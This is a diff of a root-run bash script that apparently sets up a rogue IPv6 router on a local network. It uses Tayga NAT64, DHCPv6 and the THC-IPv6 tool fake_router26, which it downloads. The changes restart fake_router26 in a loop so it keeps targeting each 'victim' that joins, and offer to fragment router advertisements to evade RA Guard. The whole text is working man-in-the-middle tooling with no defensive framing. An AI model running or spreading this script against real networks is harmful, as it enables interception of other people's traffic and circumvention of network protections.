@@ -7,8 +7,7 @@ PATH="/usr/bin:/usr/sbin:/bin:/sbin:/usr/local/bin"
 # Run me as root!
 
 #GLOBALS
-THCURL=http://www.thc.org/releases/thc-ipv6-2.3.tar.gz
-FRAGMENT=false
+
 #TAYGAINTERFACE default name for the Tayga virtual interface
 TAYGAINTERFACE="nat64"
 #DEFAULT6PREFIX default IPv6 prefix to present, we're assuming the reserved 64:FF9B::/96
@@ -42,6 +41,14 @@ DSECONDIP=""
 #If we get a blank we'll fall back to google
 #BINDFORWARDERS="8.8.8.8;"
 DEFAULTNAMESERVERS="8.8.8.8"
+
+#Download location for THC-IPv6 toolkit
+THCURL=http://www.thc.org/releases/thc-ipv6-2.3.tar.gz
+#Should we fragment our router advertisements?
+#FRAGMENT=false
+
+#fake_router26 log file
+ROUTERLOG="/var/log/router.log"
 
 ##CONFIG FILE LOCATIONS
 #wide-dhcpv6-server
@@ -256,10 +263,12 @@ function stopTayga {
 }
 #fake_router26 crashes when another victim on the system starts up, so we restart it automatically
 function startFakeRouter {
+    trap "" HUP
     while true
     do
-	trap "" 15
+	echo "restarting router"
 	fake_router26 ${DINTERFACE} -E D -A ${DEFAULT6PREFIX}:/${DIP6CIDR} -F other -D ${DIP6} -d 30
+	sleep 3
     done
 }
 
@@ -279,10 +288,12 @@ sipcalc $DINTERFACE
 # Prompt for second IP on the subnet
 read -p "Please enter an additional available IPv4 address in this range: " DSECONDIP
 #TODO check whether RA Guard is on the system, configure accordingly.
-read -p "Fragment router advertisements to evade RA Guard?"
+read -p "Fragment router advertisements to evade RA Guard? [y/n] "
 if [[ $REPLY =~ [Yy] ]]
 then
     FRAGMENT=true
+else
+    FRAGMENT=false
 fi
 #Configure these system parameters in a non-persistent way for now
 loadIPv6Module
@@ -307,7 +318,9 @@ if startTayga; then
     sleep 3
     if $FRAGMENT
     then
-	startFakeRouter >/dev/null 2>&1 &
+	startFakeRouter >> ${ROUTERLOG} 2>&1 & 
+	echo "fake_router26 should be running as daemon
+logfile at ${ROUTERLOG}"
     else
 	service radvd start
     fi
